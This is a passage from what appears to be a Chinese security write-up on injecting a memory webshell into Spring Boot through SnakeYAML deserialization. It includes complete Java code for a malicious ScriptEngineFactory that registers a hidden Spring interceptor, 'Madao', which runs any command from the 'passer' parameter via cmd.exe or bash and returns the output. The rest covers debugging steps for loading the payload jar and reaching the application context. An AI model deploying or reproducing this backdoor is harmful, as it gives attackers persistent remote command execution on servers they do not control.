    import java.util.List;
    public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
        public AwesomeScriptEngineFactory() {
            try {
                // 获取应用上下文
                WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
                // 通过绑定Bean 取出 RequestMappingHandlerMapping
                RequestMappingHandlerMapping abstractHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
                Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
                field.setAccessible(true);
                java.util.ArrayList adaptedInterceptors = (java.util.ArrayList) field.get(abstractHandlerMapping);
                //实例化恶意拦截器并注册
                for (Object i : adaptedInterceptors) {
                    if (i.getClass().getName().contains("Madao")) {
                        return;
                    }
                }
                adaptedInterceptors.add(Class.forName("artsploit.Madao").newInstance());
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        public String getEngineName() {
            return null;
        }
        public String getEngineVersion() {
            return null;
        }
        public List getExtensions() {
            return null;
        }
        public List getMimeTypes() {
            return null;
        }
        public List getNames() {
            return null;
        }
        public String getLanguageName() {
            return null;
        }
        public String getLanguageVersion() {
            return null;
        }
        public Object getParameter(String key) {
            return null;
        }
        public String getMethodCallSyntax(String obj, String m, String... args) {
            return null;
        }
        public String getOutputStatement(String toDisplay) {
            return null;
        }
        public String getProgram(String... statements) {
            return null;
        }
        public ScriptEngine getScriptEngine() {
            return null;
        }
    }
`Madao.class`：
    package artsploit;
    import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import java.io.BufferedReader;
    import java.io.InputStreamReader;
    public class Madao  extends HandlerInterceptorAdapter {
        public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
            if (request.getParameter("passer") != null) {
                String cmd = request.getParameter("passer");
                Process process;
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
                } else {
                    process = Runtime.getRuntime().exec(new String[]{"bash", "-c", cmd});
                }
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }
                response.getOutputStream().write(stringBuilder.toString().getBytes());
                response.getOutputStream().flush();
                response.getOutputStream().close();
                return false;
            }
            return true;
        }
    }
于是我信心满满的打包好，上传，刷新，一切都那么波澜不惊，仿佛无事发生。。。
### 3\. 一个一个一个的坑
#### 3.1 无法加载依赖
这我就不服了，当即拉了个漏洞环境到本地：[SpringBootVulExploit](https://github.com/LandGrey/SpringBootVulExploit/)，Idea打开，直接maven右键`debug
spring-boot:run`即可debug运行：
为方便测试，写一个控制器如下：
    package code.landgrey.controller;
    import org.springframework.beans.factory.BeanFactory;
    import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
    import org.springframework.web.bind.annotation.RequestMapping;
    import org.springframework.web.bind.annotation.RestController;
    import javax.script.ScriptEngineManager;
    import java.net.MalformedURLException;
    import java.net.URL;
    import java.net.URLClassLoader;
    @RestController
    @EnableAutoConfiguration
    public class Yaml {
        @RequestMapping("/yaml")
        public String yamlTest() throws MalformedURLException {
            URL url = new URL("http://127.0.0.1:8081/yaml-payload.jar?t="+new Date().getTime());
            new ScriptEngineManager(new URLClassLoader(new URL[]{url}));
            return "success";
        }
    }
> 由于 URLClassLoader 对于相同的url会进行缓存，故传入url为 `"http://127.0.0.1:8081/yaml-> payload.jar?t="+new Date().getTime()`，这样替换jar包后每次都会重新发起请求。
等效于yaml反序列化创建一个 ScriptEngineManger，jar包保存在本地开启的tomcat根目录下，访问一下果然报错：
在`ScriptEngineManger#initEngines`里下个断点，捕获异常：
可以看到报错原因是无法加载 springframework包
下的类，原因暂时不管，不过我们在打jar包中是不是把依赖都打包进去就好了呢，试一下，打包后的体积明显大了很多：  
果然不报依赖错误了，然而：
#### 3.2 线程绑定的上下文
报错的大概意思是：当前线程不是web线程，无法访问到当前的全局属性。那么大概就是在获取 currentRequestAttributes
时发生错误，这里下个断点，重新请求：
果然获取到的RequestAttributes为空，而正常注入时获取到的RequestAttributes：
保存了当前应用的上下文，故我们的jar包无法进行下一步利用。
那么为什么会获取不到RequestAttributes呢，再跟进一下：
即从当前类的requestAttributesHolder或inheritableRequestAttributesHolder中取出属性，看下这两个变量的定义：
是两个与线程绑定的全局变量，查看当前属性的线程HashCode：
与正常Controller获取到的属性比较：
可以看到其实在进入 ScriptEngineManger 后新创建了一个线程，故无法获取到主线程的上下文属性。
> 此处其实执行`Thread.currentThread()`获取到的仍然是同一线程，没搞懂，姑且当作spring的特性吧。
因此常规获取上下文的方法行不通了。参考[Landgrey](https://landgrey.me/blog/19/)师傅的思路：
从 `liveBenasView` 中取出当前上下文，试试可不可行，先写个控制器：
    package code.landgrey.controller;
    import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
    import org.springframework.web.bind.annotation.RequestMapping;
    import org.springframework.web.bind.annotation.RestController;
    @RestController
    @EnableAutoConfiguration
    public class LiveBeans {
        @RequestMapping("/livebeans")
        public String  beans() throws Exception{
            // 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性
            java.lang.reflect.Field filed = Class.forName("org.springframework.context.support.LiveBeansView").getDeclaredField("applicationContexts");
    // 2. 属性被 private 修饰，所以 setAccessible true
            filed.setAccessible(true);
    // 3. 获取一个 ApplicationContext 实例
            org.springframework.web.context.WebApplicationContext context =(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(null)).iterator().next();
            return "success";
        }
    }
访问发现报错：  
在 `LiveBeansView#registerApplicationContext` 方法下断点，重启spring，发现进入该方法：
获取环境变量 `mbeanDomain`为null，故不进行Bean的注册，因此也无法通过此方法获取到上下文，只能另想他招。
#### 3.3 内嵌TomcatClassloader的利用
先利用 [java-object-searcher](https://github.com/c0ny1/java-object-searcher)
找一下能获取到`applicationContext`的链，安装到本地maven后引入依赖即可使用：
        me.gv7.tools